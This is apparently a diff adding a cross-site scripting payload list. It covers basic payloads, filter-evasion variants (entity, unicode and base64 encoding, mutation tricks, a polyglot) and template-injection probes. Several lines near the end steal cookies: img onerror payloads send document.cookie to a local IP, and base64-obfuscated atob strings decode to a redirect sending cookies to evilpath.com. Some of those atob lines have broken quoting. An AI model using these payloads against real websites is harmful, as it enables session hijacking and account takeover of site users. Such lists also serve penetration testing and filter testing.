@@ -1,0 +1,151 @@
+# -- Basic payloads
+# -- -- tag payloads
+<plaintext>
+<svg/onload=alert(1)>
+<svg/onload=String.fromCharCode(88,83,83)>
+<img src=x onerror=alert(1)>
+<IMG SRC=javascript:alert(1)>  
+<IMG SRC=# onmouseover="alert('xxs')">
+<input/onmouseover="javaSCRIPT:confirm(1)"    
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<a href="javascript:alert(1)">show</a>
+<form action="javascript:alert(1)"><button>send</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
+<body onload=alert(1)>
+<input type=image src=x:x onerror=alert(1)>
+<isindex onmouseover="alert(1)" >
+<form oninput=alert(1)><input></form>
+<textarea autofocus onfocus=alert(1)>
+<input oncut=alert(1)>
+<marquee onstart=alert(1)>
+
+
+# -- -- attribute injection
+" onload="javascript:alert('X')"
+' onload='javascript:alert("X")'
+" autofocus onfocus=alert(document.domain) x="
+
+
+# -- --  javascript schema
+javascript:alert(1)
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+
+# -- -- data schema
+data:text/html,<script>alert(1)</script>   
+data:text/html;base64,<script>alert(1)</script>;   
+<object data="data:text/html,<script>alert(1)</script>">
+
+
+# -- -- vbscript schema
+<img src=x onerror="vbscript:alert(4)"/>
+<img src=x onerror="vbs:alert(3)"/>
+
+# -- -- With JS script Payloads
+";new Image().src='x'.onerror=alert(1);//
+\';alert(document.domain)//
+";var i = document.createElement("img");i.src = 'x';i.setAttribute('onerror','alert(1)');document.body.appendChild(i);//
+[].constructor.constructor(alert(1))
+&'}).finally(_ => window.location = '/');alert(1)';//
+
+
+
+
+# -- Evasion 
+# -- -- tags payloads
+<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="></iframe>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<ScRiPt>alert(1);</ScRiPt>
+<ScRiPt>alert(1);
+<ScRiPt>alert`1`<ScRiPt>
+<ScRiPt>alert`1`
+<ScR\x00iPt>alert(1)</ScR\x00iPt>
+
+<svg/onload=alert(1) 
+<svg//////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<svg onload%09=alert(1)>
+<svg %09onload=alert(1)>
+<svg %09onload%20=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<svg onload%0B=alert(1)>
+<svg><script>prompt&#40;1)</script>
+
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>eval("\u0061lert(1)")</script>
+<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
+
+<img src=x onerror="\u0061lert(1)"/>
+<img src=x onerror="eval('\141lert(1)')"/>
+<img src=x onerror="eval('\x61lert(1)')"/>
+<img src=x onerror="&#x0061;lert(1)"/>
+<img src=x onerror="&#97;lert(1)"/>
+<img src=x onerror="eval('\a\l\ert\(1\)')"/>
+<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
+
+# -- -- svg abnd markup tags 
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+<svg><animatetransform%20onbegin=alert(1)>
+
+# -- -- custom tags
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x</xss>
+
+
+# -- -- javascript schema
+<object data="JaVaScRiPt:alert(1)">
+<object data="javascript&colon;alert(1)">
+<object data="javascript&#x003A;alert(1)">
+<object data="javascript&#58;alert(1)">
+<object data="&#x6A;avascript:alert(1)">
+<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
+
+# -- -- data schema
+<object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
+<embed code="DaTa:text/html,<script>alert(1)</script>">
+<embed code="data&colon;text/html,<script>alert(1)</script>">
+<embed code="data&#x003A;text/html,<script>alert(1)</script>">
+<embed code="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">
+
+# -- -- attribute payloads
+" onload="alert(String.fromCharCode(88,83,83))"
+# -- html enities encoding incase the result return back in attributes and executed in JS events like onclick
+&apos;&rpar;&semi;&#x61;&#x6C;&#x65;&#x72;&#x74;&lpar;&#x31;&rpar;&semi;&sol;&sol;
+
+# -- -- vbscript schema
+<iMg src=a onErRor="vBsCriPt:AlErT(4)"/>
+<img src=x onerror="vbscript&#x003A;alert(1)">
+<img src=x onerror="vb&#x63;cript:alert(1)">
+<img src=x onerror="v&#00;bs&#x00;cri pt:alert(1)">
+
+# -- -- Mutation technique
+<img style="font-fa"\22onerror\3d\61lert\28\31\29\20mily:'arial' "src="x:x"/>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<scr<ScRiPt>ipt>alert(1)</scr<ScRiPt>ipt>
+
+# -- -- Manipulate with unicode
+<ımg src='secranix.png' onerror='alert(1)'>
+
+
+
+
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
+<img src=x onerror="this.src='http://192.168.0.18:8888/?c='+escape(document.cookie); this.removeAttribute('onerror');">
+<img src=x onerror="this.src='http://192.168.0.18:8888/?c='+eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=)); this.removeAttribute('onerror');">
+[].constructor.constructor("atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")")()
+setTimeout("atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")")
+setInterval("atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")")
+Function("atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")")()
+
+
+
+
+
+
+${5*5}
+{{5*5}}
